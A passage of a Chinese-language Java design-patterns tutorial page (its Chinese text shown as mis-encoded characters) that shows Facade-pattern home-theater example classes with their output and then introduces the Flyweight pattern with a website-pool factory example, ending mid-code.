class="hljs-keyword">return</span> instance;<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; popcorn on &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; popcorn ff &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pop</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; popcorn is poping  &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Projector</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Projector</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Projector</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Projector</span>();<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Projector <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; Projector on &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; Projector ff &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">focus</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; Projector is Projector  &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Screen</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Screen</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Screen</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Screen</span>();<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Screen <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">up</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; Screen up &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">down</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; Screen down &quot;</span>);<br>   &#125;<br>   <br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TheaterLight</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TheaterLight</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">TheaterLight</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TheaterLight</span>();<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TheaterLight <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; TheaterLight on &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; TheaterLight off &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dim</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; TheaterLight dim.. &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bright</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; TheaterLight bright.. &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">// TODO Auto-generated method stub</span><br><span class="hljs-comment">//è¿™é‡Œç›´æ¥è°ƒç”¨ã€‚ã€‚ å¾ˆéº»çƒ¦</span><br><span class="hljs-type">HomeTheaterFacade</span> <span class="hljs-variable">homeTheaterFacade</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HomeTheaterFacade</span>();<br>homeTheaterFacade.ready();<br>System.out.println(<span class="hljs-string">&quot;~~~~~~~~~~~~~&quot;</span>);<br>homeTheaterFacade.play();<br>System.out.println(<span class="hljs-string">&quot;~~~~~~~~~~~~~&quot;</span>);<br>homeTheaterFacade.end();<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> popcorn on </span><br><span class="hljs-code"> popcorn is poping  </span><br><span class="hljs-code"> Screen down </span><br><span class="hljs-code"> Projector on </span><br><span class="hljs-code"> Stereo on </span><br><span class="hljs-code"> dvd on </span><br><span class="hljs-section"> TheaterLight dim.. </span><br><span class="hljs-section">~~~~~~~~~~~~~</span><br><span class="hljs-section"> dvd is playing </span><br><span class="hljs-section">~~~~~~~~~~~~~</span><br><span class="hljs-code"> popcorn ff </span><br><span class="hljs-code"> TheaterLight bright.. </span><br><span class="hljs-code"> Screen up </span><br><span class="hljs-code"> Projector ff </span><br><span class="hljs-code"> Screen off </span><br><span class="hljs-code"> dvd off </span><br></code></pre></td></tr></table></figure><h2 id="å¤–è§‚æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#å¤–è§‚æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> å¤–è§‚æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li>å¤–è§‚æ¨¡å¼å¯¹å¤–å±è”½äº†å­ç³»ç»Ÿçš„ç»†èŠ‚ï¼Œå› æ­¤å¤–è§‚æ¨¡å¼é™ä½äº†å®¢æˆ·ç«¯å¯¹å­ç³»ç»Ÿä½¿ç”¨çš„å¤æ‚æ€§</li><li>å¤–è§‚æ¨¡å¼å¯¹å®¢æˆ·ç«¯ä¸å­ç³»ç»Ÿçš„è€¦åˆå…³ç³» - è§£è€¦ï¼Œè®©å­ç³»ç»Ÿå†…éƒ¨çš„æ¨¡å—æ›´æ˜“ç»´æŠ¤å’Œæ‰©å±•</li><li>é€šè¿‡åˆç†çš„ä½¿ç”¨å¤–è§‚æ¨¡å¼ï¼Œå¯ä»¥å¸®æˆ‘ä»¬æ›´å¥½çš„åˆ’åˆ†è®¿é—®çš„å±‚æ¬¡</li><li>å½“ç³»ç»Ÿéœ€è¦è¿›è¡Œåˆ†å±‚è®¾è®¡æ—¶ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ Facade æ¨¡å¼</li><li>åœ¨ç»´æŠ¤ä¸€ä¸ªé—ç•™çš„å¤§å‹ç³»ç»Ÿæ—¶ï¼Œå¯èƒ½è¿™ä¸ªç³»ç»Ÿå·²ç»å˜å¾—éå¸¸éš¾ä»¥ç»´æŠ¤å’Œæ‰©å±•ï¼Œæ­¤æ—¶å¯ä»¥è€ƒè™‘ä¸ºæ–°ç³»ç»Ÿå¼€å‘ä¸€ä¸ªFacade ç±»ï¼Œæ¥æä¾›é—ç•™ç³»ç»Ÿçš„æ¯”è¾ƒæ¸…æ™°ç®€å•çš„æ¥å£ï¼Œè®©æ–°ç³»ç»Ÿä¸ Facade ç±»äº¤äº’ï¼Œæé«˜å¤ç”¨æ€§ã€‚</li><li>ä¸èƒ½è¿‡å¤šçš„æˆ–è€…ä¸åˆç†çš„ä½¿ç”¨å¤–è§‚æ¨¡å¼ï¼Œä½¿ç”¨å¤–è§‚æ¨¡å¼å¥½ï¼Œè¿˜æ˜¯ç›´æ¥è°ƒç”¨æ¨¡å—å¥½ã€‚è¦ä»¥è®©ç³»ç»Ÿæœ‰å±‚æ¬¡ï¼Œåˆ©äºç»´æŠ¤ä¸ºç›®çš„ã€‚</li></ol><h1 id="äº«å…ƒæ¨¡å¼"><a class="markdownIt-Anchor" href="#äº«å…ƒæ¨¡å¼"></a> äº«å…ƒæ¨¡å¼</h1><p>äº«å…ƒæ¨¡å¼ï¼ˆFlyweightPatternï¼‰ä¹Ÿå« è‡é‡æ¨¡å¼ä¸»è¦ç”¨äºå‡å°‘åˆ›å»ºå¯¹è±¡çš„æ•°é‡ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨å’Œæé«˜æ€§èƒ½ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†å‡å°‘å¯¹è±¡æ•°é‡ä»è€Œæ”¹å–„åº”ç”¨æ‰€éœ€çš„å¯¹è±¡ç»“æ„çš„æ–¹å¼ã€‚</p><p>äº«å…ƒæ¨¡å¼å°è¯•é‡ç”¨ç°æœ‰çš„åŒç±»å¯¹è±¡ï¼Œå¦‚æœæœªæ‰¾åˆ°åŒ¹é…çš„å¯¹è±¡ï¼Œåˆ™åˆ›å»ºæ–°å¯¹è±¡ã€‚æˆ‘ä»¬å°†é€šè¿‡åˆ›å»º 5 ä¸ªå¯¹è±¡æ¥ç”»å‡º 20 ä¸ªåˆ†å¸ƒäºä¸åŒä½ç½®çš„åœ†æ¥æ¼”ç¤ºè¿™ç§æ¨¡å¼ã€‚ç”±äºåªæœ‰ 5ç§å¯ç”¨çš„é¢œè‰²ï¼Œæ‰€ä»¥ color å±æ€§è¢«ç”¨æ¥æ£€æŸ¥ç°æœ‰çš„ <em>Circle</em> å¯¹è±¡ã€‚</p><h2 id="ä»‹ç»-10"><a class="markdownIt-Anchor" href="#ä»‹ç»-10"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> è¿ç”¨å…±äº«æŠ€æœ¯æœ‰æ•ˆåœ°æ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> åœ¨æœ‰å¤§é‡å¯¹è±¡æ—¶ï¼Œæœ‰å¯èƒ½ä¼šé€ æˆå†…å­˜æº¢å‡ºï¼Œæˆ‘ä»¬æŠŠå…¶ä¸­å…±åŒçš„éƒ¨åˆ†æŠ½è±¡å‡ºæ¥ï¼Œå¦‚æœæœ‰ç›¸åŒçš„ä¸šåŠ¡è¯·æ±‚ï¼Œç›´æ¥è¿”å›åœ¨å†…å­˜ä¸­å·²æœ‰çš„å¯¹è±¡ï¼Œé¿å…é‡æ–°åˆ›å»ºã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> 1ã€ç³»ç»Ÿä¸­æœ‰å¤§é‡å¯¹è±¡ã€‚ 2ã€è¿™äº›å¯¹è±¡æ¶ˆè€—å¤§é‡å†…å­˜ã€‚ 3ã€è¿™äº›å¯¹è±¡çš„çŠ¶æ€å¤§éƒ¨åˆ†å¯ä»¥å¤–éƒ¨åŒ–ã€‚4ã€è¿™äº›å¯¹è±¡å¯ä»¥æŒ‰ç…§å†…è•´çŠ¶æ€åˆ†ä¸ºå¾ˆå¤šç»„ï¼Œå½“æŠŠå¤–è•´å¯¹è±¡ä»å¯¹è±¡ä¸­å‰”é™¤å‡ºæ¥æ—¶ï¼Œæ¯ä¸€ç»„å¯¹è±¡éƒ½å¯ä»¥ç”¨ä¸€ä¸ªå¯¹è±¡æ¥ä»£æ›¿ã€‚5ã€ç³»ç»Ÿä¸ä¾èµ–äºè¿™äº›å¯¹è±¡èº«ä»½ï¼Œè¿™äº›å¯¹è±¡æ˜¯ä¸å¯åˆ†è¾¨çš„ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> ç”¨å”¯ä¸€æ ‡è¯†ç åˆ¤æ–­ï¼Œå¦‚æœåœ¨å†…å­˜ä¸­æœ‰ï¼Œåˆ™è¿”å›è¿™ä¸ªå”¯ä¸€æ ‡è¯†ç æ‰€æ ‡è¯†çš„å¯¹è±¡ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> ç”¨ HashMap å­˜å‚¨è¿™äº›å¯¹è±¡ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€JAVA ä¸­çš„ Stringï¼Œå¦‚æœæœ‰åˆ™è¿”å›ï¼Œå¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²ä¿å­˜åœ¨å­—ç¬¦ä¸²ç¼“å­˜æ± é‡Œé¢ã€‚ 2ã€æ•°æ®åº“çš„æ•°æ®æ± ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> å¤§å¤§å‡å°‘å¯¹è±¡çš„åˆ›å»ºï¼Œé™ä½ç³»ç»Ÿçš„å†…å­˜ï¼Œä½¿æ•ˆç‡æé«˜ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> æé«˜äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼Œéœ€è¦åˆ†ç¦»å‡ºå¤–éƒ¨çŠ¶æ€å’Œå†…éƒ¨çŠ¶æ€ï¼Œè€Œä¸”å¤–éƒ¨çŠ¶æ€å…·æœ‰å›ºæœ‰åŒ–çš„æ€§è´¨ï¼Œä¸åº”è¯¥éšç€å†…éƒ¨çŠ¶æ€çš„å˜åŒ–è€Œå˜åŒ–ï¼Œå¦åˆ™ä¼šé€ æˆç³»ç»Ÿçš„æ··ä¹±ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€ç³»ç»Ÿæœ‰å¤§é‡ç›¸ä¼¼å¯¹è±¡ã€‚ 2ã€éœ€è¦ç¼“å†²æ± çš„åœºæ™¯ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> 1ã€æ³¨æ„åˆ’åˆ†å¤–éƒ¨çŠ¶æ€å’Œå†…éƒ¨çŠ¶æ€ï¼Œå¦åˆ™å¯èƒ½ä¼šå¼•èµ·çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚ 2ã€è¿™äº›ç±»å¿…é¡»æœ‰ä¸€ä¸ªå·¥å‚å¯¹è±¡åŠ ä»¥æ§åˆ¶ã€‚</p><p><strong>äº«å…ƒæ¨¡å¼çš„åŸç†ç±»å›¾ï¼š</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103100919853.png" alt="image-20230103100919853" /></p><p>å¯¹åŸç†å›¾çš„è¯´æ˜-å³(æ¨¡å¼çš„è§’è‰²åŠèŒè´£)</p><ol><li><p>FlyWeight æ˜¯æŠ½è±¡çš„äº«å…ƒè§’è‰², ä»–æ˜¯äº§å“çš„æŠ½è±¡ç±», åŒæ—¶å®šä¹‰å‡ºå¯¹è±¡çš„å¤–éƒ¨çŠ¶æ€å’Œå†…éƒ¨çŠ¶æ€(åé¢ä»‹ç») çš„æ¥å£æˆ–å®ç°</p></li><li><p>ConcreteFlyWeight æ˜¯å…·ä½“çš„äº«å…ƒè§’è‰²ï¼Œæ˜¯å…·ä½“çš„äº§å“ç±»ï¼Œå®ç°æŠ½è±¡è§’è‰²å®šä¹‰ç›¸å…³ä¸šåŠ¡</p></li><li><p>UnSharedConcreteFlyWeight æ˜¯ä¸å¯å…±äº«çš„è§’è‰²ï¼Œä¸€èˆ¬ä¸ä¼šå‡ºç°åœ¨äº«å…ƒå·¥å‚ã€‚</p></li><li><p>FlyWeightFactory äº«å…ƒå·¥å‚ç±»ï¼Œç”¨äºæ„å»ºä¸€ä¸ªæ± å®¹å™¨(é›†åˆ)ï¼Œ åŒæ—¶æä¾›ä»æ± ä¸­è·å–å¯¹è±¡æ–¹æ³•</p></li></ol><h2 id="å®ç°-8"><a class="markdownIt-Anchor" href="#å®ç°-8"></a> å®ç°</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103110105715.png" alt="image-20230103110105715" /></p><p><code>WebSite</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.flyweight;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSite</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">use</span><span class="hljs-params">(User user)</span>;<span class="hljs-comment">//æŠ½è±¡æ–¹æ³•</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * //å…±äº«æ–¹æ³•</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showMe</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ¬¢è¿ä½¿ç”¨xtwoyç³»ç»Ÿ&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ConcreteWebSite</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.flyweight;<br><br><span class="hljs-comment">//å…·ä½“ç½‘ç«™</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteWebSite</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSite</span> &#123;<br><br>   <span class="hljs-comment">//å…±äº«çš„éƒ¨åˆ†ï¼Œå†…éƒ¨çŠ¶æ€</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//ç½‘ç«™å‘å¸ƒçš„å½¢å¼(ç±»å‹)</span><br><br>   <br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConcreteWebSite</span><span class="hljs-params">(String type)</span> &#123;<br>      <br>      <span class="hljs-built_in">this</span>.type = type;<br>   &#125;<br><br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">use</span><span class="hljs-params">(User user)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      showMe();<br>      System.out.println(<span class="hljs-string">&quot;ç½‘ç«™çš„å‘å¸ƒå½¢å¼ä¸º:&quot;</span> + type + <span class="hljs-string">&quot; åœ¨ä½¿ç”¨ä¸­ .. ä½¿ç”¨è€…æ˜¯&quot;</span> + user.getName());<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>WebSiteFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.flyweight;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">// ç½‘ç«™å·¥å‚ç±»ï¼Œæ ¹æ®éœ€è¦è¿”å›å‹ä¸€ä¸ªç½‘ç«™</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSiteFactory</span> &#123;<br><br>   <br>   <span class="hljs-comment">//é›†åˆï¼Œ å……å½“æ± çš„ä½œç”¨</span><br>   <span class="hljs-keyword">private</span> HashMap&lt;String, ConcreteWebSite&gt; pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>   <br>   <span class="hljs-comment">//æ ¹æ®ç½‘ç«™çš„ç±»å‹ï¼Œè¿”å›ä¸€ä¸ªç½‘ç«™, å¦‚æœæ²¡æœ‰å°±åˆ›å»ºä¸€ä¸ªç½‘ç«™ï¼Œå¹¶æ”¾å…¥åˆ°æ± ä¸­,å¹¶è¿”å›</span><br>   <span class="hljs-keyword">public</span> WebSite <span class="hljs-title function_">getWebSiteCategory</span><span class="hljs-params">(String type)</span> &#123;<br>      <span class="hljs-keyword">if</span>(!pool.containsKey(type)) &#123;<br>         <span class="hljs-comment">//å°±åˆ›å»ºä¸€ä¸ªç½‘ç«™ï¼Œå¹¶æ”¾å…¥åˆ°æ± ä¸­</span><br>         pool.put(type, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcreteWebSite</span>(type));<br>      &#125;<br>      <br>      <span class="hljs-keyword">return</span> (WebSite)pool.get(type);<br>   &#125;<br>   <br>   <span class="hljs-comment">//è·å–ç½‘ç«™åˆ†ç±»çš„æ€»æ•° (æ± ä¸­æœ‰å¤šå°‘ä¸ªç½‘ç«™ç±»å‹)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getWebSiteCount</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> pool.size();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>User</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.flyweight;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>   <br>   <span class="hljs-keyword">private</span> String name;<br><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.name = name;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> name;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-built_in">this</span>.name = name;<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.flyweight;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method 